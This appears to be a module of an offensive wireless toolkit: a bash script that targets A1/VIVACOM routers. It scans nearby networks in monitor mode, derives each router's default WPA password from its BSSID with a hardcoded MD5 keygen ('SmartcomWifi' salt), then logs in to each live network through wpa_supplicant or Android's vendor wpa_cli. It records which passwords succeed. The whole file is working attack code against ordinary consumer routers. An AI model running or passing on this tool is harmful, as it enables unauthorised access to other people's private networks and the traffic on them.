#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "A1 / VIVACOM WiFi" "BSSID-based default password generator · live password tester"

require_tool airodump-ng "apt install aircrack-ng"
require_tool iw          "apt install iw"

outdir="$(make_outdir)"
outfile="$outdir/vivacom_passwords.txt"
: > "$outfile"

# ── Pipeline: skip (requires physical WiFi + BSSID selection) ─────────────────
if [[ -n "${SESSION_DIR:-}" ]]; then
  printf '  %s[CHAIN]%s Vivacom Keygen requires interactive interface/BSSID selection — skipping in pipeline%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
  mark_done "$outfile"
  exit 0
fi

TMP_DIR="$(mktemp -d /tmp/vivacom_XXXXXX)"
MON_IFACE=""

# ── Interface selection ────────────────────────────────────────────────────────
section "WIRELESS INTERFACE"

mapfile -t _wifi < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
if [[ ${#_wifi[@]} -eq 0 ]]; then
  printf '  %s[!]%s No wireless interfaces found%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
fi

for i in "${!_wifi[@]}"; do
  printf '  %s[%02d]%s  %s\n' "${CYAN}" "$((i+1))" "${RESET}" "${_wifi[$i]}"
done

printf '\n  %s>>%s Interface [1-%d]: ' "${CYAN}" "${RESET}" "${#_wifi[@]}"
read -r _sel; _sel="${_sel:-1}"

if ! [[ "$_sel" =~ ^[0-9]+$ ]] || (( _sel < 1 || _sel > ${#_wifi[@]} )); then
  printf '  %s[!]%s Invalid selection%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
fi
IFACE="${_wifi[$((_sel-1))]}"
MON_IFACE="$IFACE"
printf '\n  %s[SYS]%s Interface : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"

# ── Monitor mode helpers ───────────────────────────────────────────────────────
_restore_managed() {
  printf '  %s[*]%s Restoring managed mode...%s\n' "${CYAN}" "${RESET}" "${RESET}"
  if [[ "$MON_IFACE" == *mon ]] && command -v airmon-ng &>/dev/null; then
    airmon-ng stop "$MON_IFACE" &>/dev/null || true
  fi
  ip link set "$IFACE" down 2>/dev/null
  iw dev "$IFACE" set type managed 2>/dev/null || true
  ip link set "$IFACE" up 2>/dev/null
  printf '  %s[+]%s Interface %s%s%s restored.%s\n' "${GREEN}" "${RESET}" "${CYAN}" "$IFACE" "${RESET}" "${RESET}"
}

trap '_restore_managed; rm -rf "$TMP_DIR"' EXIT

_setup_monitor() {
  local phy; phy=$(iw dev "$IFACE" info 2>/dev/null | awk '/wiphy/{print "phy"$2}')
  [[ -z "$phy" ]] && { printf '  %s[!]%s Cannot determine phy for %s%s\n' "${RED}" "${RESET}" "$IFACE" "${RESET}"; exit 1; }
  iw phy "$phy" info 2>/dev/null | grep -q "monitor" \
    || { printf '  %s[!]%s %s does not support monitor mode%s\n' "${RED}" "${RESET}" "$IFACE" "${RESET}"; exit 1; }

  printf '  %s[*]%s Switching to monitor mode...%s\n' "${CYAN}" "${RESET}" "${RESET}"
  if command -v airmon-ng &>/dev/null; then
    airmon-ng check kill &>/dev/null || true
    airmon-ng start "$IFACE" &>/dev/null || true
    if ip link show "${IFACE}mon" &>/dev/null 2>&1; then
      MON_IFACE="${IFACE}mon"
    else
      MON_IFACE="$IFACE"
    fi
  else
    pkill -9 wpa_supplicant 2>/dev/null || true
    MON_IFACE="$IFACE"
  fi

  if ! iw dev "$MON_IFACE" info 2>/dev/null | grep -q "type monitor"; then
    ip link set "$IFACE" down
    iw dev "$IFACE" set type monitor || {
      printf '  %s[!]%s Monitor mode failed — try: airmon-ng check kill%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
    }
    ip link set "$IFACE" up; MON_IFACE="$IFACE"
  fi
  ip link set "$MON_IFACE" up 2>/dev/null || true; sleep 0.3
  iw dev "$MON_IFACE" info 2>/dev/null | grep -q "type monitor" \
    || { printf '  %s[!]%s Monitor mode not confirmed%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1; }
  printf '  %s[+]%s Monitor mode active on %s%s%s%s\n\n' "${GREEN}" "${RESET}" "${CYAN}" "$MON_IFACE" "${RESET}" "${RESET}"
}

# ── Password generation ────────────────────────────────────────────────────────
# Algorithm: md5( tolower(last-8-chars-of-BSSID) + "SmartcomWifi" )[0:8]
# The last 8 chars of "AA:BB:CC:DD:EE:FF" = "DD:EE:FF" (colons included).
_gen_password() {
  local bssid="$1"
  [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && { echo "INVALID_BSSID"; return; }
  local tail; tail=$(printf '%s' "${bssid: -8}" | tr '[:upper:]' '[:lower:]')
  local hash;  hash=$(printf '%s' "${tail}SmartcomWifi" | md5sum | awk '{print $1}')
  echo "${hash:0:8}"
}

# ── Scan ──────────────────────────────────────────────────────────────────────
section "MONITOR MODE"
_setup_monitor

section "SCANNING FOR A1 / VIVACOM NETWORKS"

printf '  %s[*]%s Scanning 10s (all bands)...%s\n\n' "${CYAN}" "${RESET}" "${RESET}"
airodump-ng --band abg -w "$TMP_DIR/scan" --output-format csv "$MON_IFACE" &>/dev/null &
_pid=$!
sleep 10
kill -SIGINT "$_pid" 2>/dev/null; wait "$_pid" 2>/dev/null

CSV=$(ls -t "$TMP_DIR"/scan-*.csv 2>/dev/null | head -1)
if [[ ! -f "${CSV:-}" ]]; then
  printf '  %s[!]%s No scan results found.%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
fi

printf '  %s[*]%s Parsing scan results...%s\n\n' "${CYAN}" "${RESET}" "${RESET}"

declare -A NETWORKS
while IFS= read -r _line; do
  IFS=',' read -ra _f <<< "$_line"
  _bssid="${_f[0]:-}"; _bssid="${_bssid// /}"
  _essid="${_f[13]:-}"; _essid="${_essid// /}"
  [[ "$_bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
  [[ -z "$_essid" ]] && continue
  [[ "$_essid" =~ ^(A1_|VIVACOM_) ]] && NETWORKS["$_bssid"]="$_essid"
done < <(awk -F',' 'NR>1{print}' "$CSV")

if [[ ${#NETWORKS[@]} -eq 0 ]]; then
  printf '  %s[!]%s No A1_ or VIVACOM_ networks found.%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  printf '\n  %s>>%s Enter BSSID manually (or Enter to skip): ' "${CYAN}" "${RESET}"
  read -r _manual_bssid
  if [[ -n "$_manual_bssid" ]]; then
    printf '  %s>>%s ESSID label: ' "${CYAN}" "${RESET}"
    read -r _manual_essid
    NETWORKS["$_manual_bssid"]="${_manual_essid:-MANUAL}"
  else
    printf '  %s[~]%s No networks to process.%s\n' "${DIM}" "${RESET}" "${RESET}"; exit 0
  fi
fi

# ── Generate passwords ─────────────────────────────────────────────────────────
section "PASSWORD GENERATION"

printf '  %s[*]%s Generating default passwords...\n\n' "${CYAN}" "${RESET}"
printf '=== A1/VIVACOM DEFAULT PASSWORDS ===\n' >> "$outfile"

for _bssid in "${!NETWORKS[@]}"; do
  _essid="${NETWORKS[$_bssid]}"
  _pass=$(_gen_password "$_bssid")
  printf '  %s[+]%s SSID: %s%-30s%s  BSSID: %s%s%s\n' \
    "${GREEN}" "${RESET}" "${CYAN}" "$_essid" "${RESET}" "${DIM}" "$_bssid" "${RESET}"
  printf '       Password: %s%s%s\n\n' "${BOLD}" "$_pass" "${RESET}"
  printf 'SSID: %s\nBSSID: %s\nPassword: %s\n\n' "$_essid" "$_bssid" "$_pass" >> "$outfile"
done

# ── Restore to managed mode before testing ────────────────────────────────────
section "RESTORE INTERFACE"
_restore_managed
trap 'rm -rf "$TMP_DIR"' EXIT   # clear EXIT trap — managed mode already restored

# ── Test passwords against live networks ──────────────────────────────────────
printf '\n  %s>>%s Test passwords against live networks? [Y/n]: ' "${CYAN}" "${RESET}"
read -r _do_test; _do_test="${_do_test:-Y}"

if [[ "$_do_test" =~ ^[Yy] ]]; then
  section "LIVE PASSWORD TEST"
  printf '\n=== LIVE TEST RESULTS ===\n' >> "$outfile"

  _TEST_RESULT=""

  # ── Path A: external USB adapter — Kali's wpa_supplicant owns the interface ──
  if [[ "$IFACE" != "wlan0" ]]; then
    printf '  %s[SYS]%s External interface %s — using Kali wpa_supplicant directly%s\n\n' \
      "${CYAN}" "${RESET}" "$IFACE" "${RESET}"
    require_tool wpa_supplicant "apt install wpasupplicant"

    _WPA_CTRL="/tmp/vivacom_wpa_$$"
    _test_password() {
      local essid="$1" bssid="$2" pass="$3"
      local conf="$TMP_DIR/wpa_${bssid//:/}.conf"
      local pidfile="$TMP_DIR/wpa_${bssid//:/}.pid"
      rm -rf "$_WPA_CTRL"
      cat > "$conf" << WPAEOF
ctrl_interface=$_WPA_CTRL
update_config=0
network={
    ssid="$essid"
    bssid=$bssid
    psk="$pass"
    scan_ssid=1
    key_mgmt=WPA-PSK
}
WPAEOF
      wpa_supplicant -B -i "$IFACE" -c "$conf" -P "$pidfile" 2>/dev/null
      local _res="FAIL" _t _state
      for _t in $(seq 1 15); do
        sleep 1
        _state=$(wpa_cli -p "$_WPA_CTRL" -i "$IFACE" status 2>/dev/null \
          | grep "^wpa_state=" | cut -d= -f2)
        [[ "$_state" == "COMPLETED" ]] && { _res="OK"; break; }
      done
      local _wpid; _wpid=$(cat "$pidfile" 2>/dev/null || true)
      [[ -n "$_wpid" ]] && kill "$_wpid" 2>/dev/null || true
      wpa_cli -p "$_WPA_CTRL" -i "$IFACE" terminate 2>/dev/null || true
      rm -rf "$_WPA_CTRL" "$conf" "$pidfile"
      sleep 1
      _TEST_RESULT="$_res"
    }

  # ── Path B: built-in wlan0 — go through Android's vendor wpa_supplicant ─────
  else
    printf '  %s[!]%s wlan0 (Android-managed) — WiFi interrupted during test.%s\n' \
      "${YELLOW}" "${RESET}" "${RESET}"
    printf '  %s[!]%s Toggle airplane mode if it hangs — Android WiFi restores at end.%s\n\n' \
      "${YELLOW}" "${RESET}" "${RESET}"

    # Ensure Android WiFi is up
    svc wifi enable 2>/dev/null || true; sleep 3

    # Use nsenter to enter Android mount namespace, then call vendor wpa_cli.
    # Android's wpa_cli (AOSP-patched) creates its reply socket at
    # /data/local/tmp (not /tmp), so both namespaces can reach it.
    _ANDROID_WPA="/proc/1/root/vendor/bin/wpa_cli"
    _ANDROID_SOCK="/data/vendor/wifi/wpa/sockets"
    _NSENTER="nsenter --mount=/proc/1/ns/mnt --"

    # Verify Android's wpa_supplicant is responding
    if ! $_NSENTER "$_ANDROID_WPA" -p "$_ANDROID_SOCK" -i wlan0 ping &>/dev/null; then
      printf '  %s[!]%s Android wpa_supplicant not responding.%s\n' "${RED}" "${RESET}" "${RESET}"
      printf '       Toggle airplane mode on the phone, wait 5 s, then re-run.\n'
      _TEST_RESULT="ABORT"
    else
      printf '  %s[+]%s Android wpa_supplicant ready.%s\n\n' "${GREEN}" "${RESET}" "${RESET}"

      _test_password() {
        local essid="$1" bssid="$2" pass="$3"
        local _net_id
        _net_id=$($_NSENTER "$_ANDROID_WPA" -p "$_ANDROID_SOCK" -i wlan0 \
          add_network 2>/dev/null | grep -E '^[0-9]+$' | tail -1)
        [[ -z "$_net_id" || ! "$_net_id" =~ ^[0-9]+$ ]] && { _TEST_RESULT="SKIP"; return; }

        $_NSENTER "$_ANDROID_WPA" -p "$_ANDROID_SOCK" -i wlan0 \
          set_network "$_net_id" ssid "\"$essid\"" &>/dev/null
        $_NSENTER "$_ANDROID_WPA" -p "$_ANDROID_SOCK" -i wlan0 \
          set_network "$_net_id" psk "\"$pass\""  &>/dev/null
        $_NSENTER "$_ANDROID_WPA" -p "$_ANDROID_SOCK" -i wlan0 \
          set_network "$_net_id" bssid "$bssid"    &>/dev/null
        $_NSENTER "$_ANDROID_WPA" -p "$_ANDROID_SOCK" -i wlan0 \
          set_network "$_net_id" scan_ssid 1       &>/dev/null
        $_NSENTER "$_ANDROID_WPA" -p "$_ANDROID_SOCK" -i wlan0 \
          set_network "$_net_id" key_mgmt WPA-PSK  &>/dev/null
        $_NSENTER "$_ANDROID_WPA" -p "$_ANDROID_SOCK" -i wlan0 \
          select_network "$_net_id" &>/dev/null

        local _res="FAIL" _t _state
        for _t in $(seq 1 15); do
          sleep 1
          _state=$($_NSENTER "$_ANDROID_WPA" -p "$_ANDROID_SOCK" -i wlan0 status 2>/dev/null \
            | grep "^wpa_state=" | cut -d= -f2)
          [[ "$_state" == "COMPLETED" ]] && { _res="OK"; break; }
        done

        $_NSENTER "$_ANDROID_WPA" -p "$_ANDROID_SOCK" -i wlan0 \
          remove_network "$_net_id" &>/dev/null
        $_NSENTER "$_ANDROID_WPA" -p "$_ANDROID_SOCK" -i wlan0 disconnect &>/dev/null
        sleep 1
        $_NSENTER "$_ANDROID_WPA" -p "$_ANDROID_SOCK" -i wlan0 reconnect &>/dev/null
        _TEST_RESULT="$_res"
      }
    fi
  fi

  # ── Common test loop ──────────────────────────────────────────────────────────
  if [[ "$_TEST_RESULT" != "ABORT" ]]; then
    printf '  %s[*]%s Each test waits up to 15 s for WPA handshake...\n\n' "${CYAN}" "${RESET}"
    for _bssid in "${!NETWORKS[@]}"; do
      _essid="${NETWORKS[$_bssid]}"
      _pass=$(_gen_password "$_bssid")
      printf '  %s[*]%s %-30s  BSSID: %-17s  pass: %s%s%s  ...' \
        "${CYAN}" "${RESET}" "$_essid" "$_bssid" "${BOLD}" "$_pass" "${RESET}"
      _test_password "$_essid" "$_bssid" "$_pass"
      if [[ "$_TEST_RESULT" == "OK" ]]; then
        printf '  %s[+] CORRECT%s\n' "${GREEN}" "${RESET}"
        printf 'TEST OK  — SSID=%s BSSID=%s PASS=%s\n' "$_essid" "$_bssid" "$_pass" >> "$outfile"
      elif [[ "$_TEST_RESULT" == "SKIP" ]]; then
        printf '  %s[~] SKIP%s\n' "${DIM}" "${RESET}"
      else
        printf '  %s[-] WRONG%s\n' "${RED}" "${RESET}"
        printf 'TEST FAIL — SSID=%s BSSID=%s PASS=%s\n' "$_essid" "$_bssid" "$_pass" >> "$outfile"
      fi
    done
  fi
fi

mark_done "$outfile"
printf '\n  %s[SYS]%s Report : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
